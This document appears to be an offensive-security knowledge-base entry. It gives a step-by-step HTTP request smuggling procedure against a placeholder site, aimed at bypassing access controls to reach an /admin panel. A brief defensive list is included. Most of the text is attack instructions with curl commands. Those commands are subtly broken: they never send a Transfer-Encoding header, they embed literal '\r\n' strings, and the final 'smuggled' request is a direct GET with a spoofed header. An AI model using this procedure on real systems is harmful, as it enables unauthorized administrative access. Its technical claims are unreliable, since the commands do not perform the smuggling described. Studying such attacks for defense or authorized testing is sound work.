---
id: 0411d32d-05b7-4a23-a3ec-4c9cd57433bf
name: HTTP-Request-Smuggling-to-Reveal-Front-End-Rewriting-and-Access-Admin-Panel
type: procedure
verified: true
submitted: true
created_at: '2020-08-12T03:59:14.781954+00:00'
updated_at: '2023-05-26T01:05:50.739997+00:00'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - http-request-smuggling
  - web-applications
commands:
  - '[[commands/curl-http-smuggling-search-payload]]'
  - '[[commands/curl-http-smuggling-admin-access]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# HTTP-Request-Smuggling-to-Reveal-Front-End-Rewriting-and-Access-Admin-Panel

## Summary

This procedure demonstrates HTTP request smuggling to observe front-end server response headers and rewrite requests to access backend resources, such as an admin panel. By exploiting differences in how front-end and backend servers parse HTTP requests, an attacker can smuggle malicious requests to bypass access controls and reveal hidden functionality.

## Description

HTTP request smuggling occurs when front-end (e.g., load balancer or proxy) and backend servers interpret HTTP request headers differently, allowing an attacker to inject a second request into the body of the first. In this scenario, the attacker intercepts a legitimate search request, appends a smuggling payload to observe front-end rewriting (e.g., via custom headers like x-bkdpqI-Ip), and then crafts a follow-up request to access the /admin endpoint by mimicking the observed rewriting. This technique targets web applications vulnerable to CL.TE or TE.CL smuggling variants, assuming the front-end uses Content-Length while the backend uses Transfer-Encoding. Prerequisites include network access to the target web app and tools for request interception and manipulation. Success grants unauthorized access to backend admin resources.

## Requirements

1. Network access to the target web application (e.g., via browser or proxy).
2. Tools like Burp Suite for intercepting and modifying HTTP requests, or curl for CLI-based testing.
3. Knowledge of the target's search endpoint (e.g., /search) and admin endpoint (e.g., /admin).
4. Optional: A wordlist or observed response headers from prior reconnaissance.

## Defense

Defensive measures and detection strategies:

- Normalize HTTP parsing across front-end and backend servers (e.g., enforce strict Content-Length handling).
- Implement request smuggling detection via WAF rules checking for mismatched Content-Length and Transfer-Encoding headers.
- Monitor for anomalous requests with duplicate headers or unexpected body content.
- Log and alert on access to sensitive endpoints like /admin from unusual sources.

## Objectives

1. Observe front-end request rewriting by smuggling a payload into a legitimate request.
2. Extract key response parameters (e.g., custom IP headers) to understand backend routing.
3. Rewrite and smuggle a request to access restricted backend resources like the admin panel.
4. Verify unauthorized access to confirm exploitation success.

## Instructions

### Step 1: Intercept Legitimate Search Request

**Context**: Begin by capturing a normal search request to the application to serve as the base for smuggling. This establishes the session and endpoint structure.

Use Burp Suite's Proxy or Repeater to intercept the request, or simulate with curl if direct access is available.

**Command** ([[commands/curl-http-smuggling-search-payload]]):
```bash
curl -X POST http://target.com/ -H "Content-Type: application/x-www-form-urlencoded" -H "Content-Length: 200" -H "Connection: close" -d "search=test" --verbose
```

> This sends a basic search request and observes the response. Expected output includes standard HTTP response with no anomalies yet. Verify the request reaches the server without errors.

### Step 2: Append Smuggling Payload to Reveal Front-End Rewriting

**Context**: Modify the intercepted search request by appending a smuggling payload (e.g., a null request with mismatched headers) to force the front-end to process it differently from the backend, revealing rewriting behaviors in the response.

Reference the smuggling payload code [[codes/HTTP-Request-Smuggling-Payload-for-Search-Request]] and integrate it into the request body using Burp Repeater or curl with custom headers.

**Command** ([[commands/curl-http-smuggling-search-payload]]):
```bash
curl -X POST http://target.com/ -H "Content-Type: application/x-www-form-urlencoded" -H "Content-Length: 200" -H "Connection: close" --data-raw "search=test\r\n0\r\nPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 200\r\nConnection: close\r\n\r\nsearch=test" --verbose
```

> The smuggling payload is injected after the legitimate body. Expected output includes a response with custom headers like x-bkdpqI-Ip, indicating front-end rewriting (e.g., IP substitution for backend routing).

### Step 3: Analyze Response and Rewrite for Admin Access

**Context**: From the smuggled response, note the front-end rewriting (e.g., x-BkdpqI_Ip: 127.0.0.1) and use it to craft a new request that tricks the backend into processing the admin access as legitimate.

Use the observed header in a new smuggling payload targeting /admin.

Reference the admin access payload code [[codes/HTTP-Request-Smuggling-Payload-for-Admin-Access]] and send via Burp or curl.

**Command** ([[commands/curl-http-smuggling-admin-access]]):
```bash
curl -X GET http://target.com/admin -H "x-BkdpqI_Ip: 127.0.0.1" -H "Content-Type: application/x-www-form-urlencoded" -H "Content-Length: 200" -H "Connection: close" -d "x=1" --verbose
```

> Expected output is the admin panel content or redirect, confirming access. If smuggling is successful, the backend treats this as an internal request.

### Step 4: Verify Admin Panel Access

**Context**: Send the fully rewritten smuggled request to confirm unauthorized access to the admin panel.

Repeat the modified request in Burp Repeater, ensuring the smuggling chain holds.

**Expected Output**: Successful response from /admin, such as login page or dashboard HTML, without authentication prompts.

> If access is granted, the procedure succeeds. Check for session cookies or further backend exposure.
